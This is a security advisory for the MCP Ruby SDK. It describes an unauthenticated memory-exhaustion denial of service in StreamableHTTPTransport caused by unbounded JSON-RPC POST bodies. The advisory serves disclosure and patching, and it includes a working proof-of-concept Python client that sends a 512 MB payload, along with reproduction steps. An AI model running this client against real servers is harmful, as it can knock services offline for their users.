# [H] MCP Ruby SDK: Unbounded JSON-RPC request body causes uncontrolled memory allocation in StreamableHTTPTransport

## Summary
Severity: High
Advisory: GHSA-h669-8m4g-r2hc
CVE: CVE-2026-67432
CWE: CWE-770
Ecosystem: RubyGems
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-07-30
Source: https://github.com/advisories/GHSA-h669-8m4g-r2hc
Type: github-advisory

## Affected
- RubyGems: `mcp` — affected >=0 <0.23.0

## Details
## Summary

An unauthenticated remote attacker can force any MCP Ruby SDK server using `MCP::Server::Transports::StreamableHTTPTransport` to allocate gigabytes of memory by sending a single oversized JSON-RPC POST. The transport reads the entire HTTP body into a Ruby `String` and parses it with `JSON.parse(body, symbolize_names: true)` with no size limit, no `Content-Length` pre-check, and no streaming parser, allowing trivial denial of service against the worker process.

## Affected component

`lib/mcp/server/transports/streamable_http_transport.rb`, method `handle_post`:

- Line 341: `body_string = request.body.read` — reads the full HTTP body into memory with no upper bound.
- Lines 531–535: `JSON.parse(body_string, symbolize_names: true)` — fully materialises the parsed object graph; with `symbolize_names: true` every JSON key also allocates a Ruby symbol.

The vulnerable path runs **before** session validation, so it is reachable in both the default stateful mode and in `stateless: true` mode, without an `Mcp-Session-Id` header and without any prior authentication.

A second instance of the same root cause exists in `lib/mcp/server/transports/stdio_transport.rb:23` (`$stdin.gets` with no `limit:` argument). The practical impact there is limited because the stdio peer is normally a trusted parent process, but the fix should cover both transports.

## Proof of concept

Both files below are self-contained. Save them anywhere on disk, run the server in one terminal and the client in another. The only dependencies are the SDK's existing Gemfile entries (`rack ~> 3.2`, `rackup >= 2.1.0`, `webrick ~> 1.9`) and Python's standard library.

### Server (`oom_poc_server.rb`)

```ruby
require "bundler/setup"
require "mcp"
require "mcp/server/transports/streamable_http_transport"
require "rackup"
require "webrick"
require "rackup/handler/webrick"

server = MCP::Server.new(name: "oom-poc-target", tools: [])
transport = MCP::Server::Transports::StreamableHTTPTransport.new(
  server, stateless: true, enable_json_response: true,
)

Thread.new do
  loop do
    rss_mb = `ps -o rss= -p #{Process.pid}`.to_i / 1024
    STDERR.puts("[mem] PID=#{Process.pid} RSS=#{rss_mb} MB")
    sleep 2
  end
end

STDERR.puts("[poc] listening on http://127.0.0.1:9293/")
Rackup::Handler::WEBrick.run(
  transport,
  Host: "127.0.0.1", Port: 9293,
  AccessLog: [], Logger: WEBrick::Log.new(File::NULL),
)
```

### Client (`oom_poc_client.py`)

```python
import socket

HOST, PORT, PAYLOAD_MB = "127.0.0.1", 9293, 512

inner = b"A" * (PAYLOAD_MB * 1024 * 1024 - 64)
body  = b'{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"x":"' + inner + b'"}}'

headers = (
    f"POST / HTTP/1.1\r\nHost: {HOST}:{PORT}\r\n"
    f"Content-Type: application/json\r\n"
    f"Accept: application/json, text/event-stream\r\n"
    f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
).encode()

s = socket.create_connection((HOST, PORT), timeout=120)
s.sendall(headers)
for i in range(0, len(body), 1 << 20):
    s.sendall(body[i:i + (1 << 20)])
print(f"sent {PAYLOAD_MB} MB")
try:
    print("recv:", s.recv(2048)[:200])
except OSError as e:
    print("server unresponsive:", e)
```

### Reproduction commands

```sh
bundle install
ruby oom_poc_server.rb              # terminal A
python3 oom_poc_client.py           # terminal B
```

### Observed result

Tested on macOS, Ruby 3.2.4 (rbenv), against the SDK's `main` branch with `rack 3.2.6 / rackup 2.3.1 / webrick 1.9.2`:

```
[mem] PID=61394 RSS=44   MB        # idle baseline
[mem] PID=61394 RSS=44   MB
[mem] PID=61394 RSS=44   MB
[mem] PID=61394 RSS=1663 MB        # immediately after one 512 MB POST
[mem] PID=61394 RSS=1663 MB        # memory not released
[mem] PID=61394 RSS=1663 MB
```

A single unauthenticated POST grew the worker's RSS from 44 MB to 1.66 GB (~37× amplification). On any deployment with a per-worker memory cap at or below ~2 GB, the same request OOM-kills the worker.

<img width="1588" height="836" alt="poc1-1" src="https://github.com/user-attachments/assets/13522d05-b7fa-4c05-ba65-ce8ff7d66d4f" />

<img width="1400" height="948" alt="poc1-2" src="https://github.com/user-attachments/assets/b230bf85-bed9-46ca-91cf-53ffd10306a6" />



## Impact

- **Attacker requirements:** none beyond TCP reach of the MCP endpoint. No session, no credentials, no prior interaction.
- **Effect:** memory-exhaustion denial of service. A single request can take a worker offline; sustained low-rate requests keep the service down across worker restarts. On multi-tenant deployments a single attacker tenant can starve neighbours.
- **Affected deployments:** every server mounting `MCP::Server::Transports::StreamableHTTPTransport` as a Rack app — the canonical HTTP deployment pattern. Both stateful and `stateless: true` configurations are affected.

## Suggested mitigation

1. Reject requests whose `Content-Length` (or actual read length) exceeds a configurable threshold (e.g. 4 MiB by default) before calling `request.body.read`.
2. Use a streaming JSON parser, or pass `max_nesting:` plus a hard byte cap to `JSON.parse`.
3. Apply the same `limit:` argument to `$stdin.gets` in `StdioTransport` for defence in depth.

## References
- https://github.com/modelcontextprotocol/ruby-sdk/security/advisories/GHSA-h669-8m4g-r2hc
- https://nvd.nist.gov/vuln/detail/CVE-2026-67432
- https://github.com/modelcontextprotocol/ruby-sdk/commit/772e0cb1f9db69312006926eee59a7287ad50166
- https://github.com/modelcontextprotocol/ruby-sdk
- https://github.com/modelcontextprotocol/ruby-sdk/releases/tag/v0.23.0
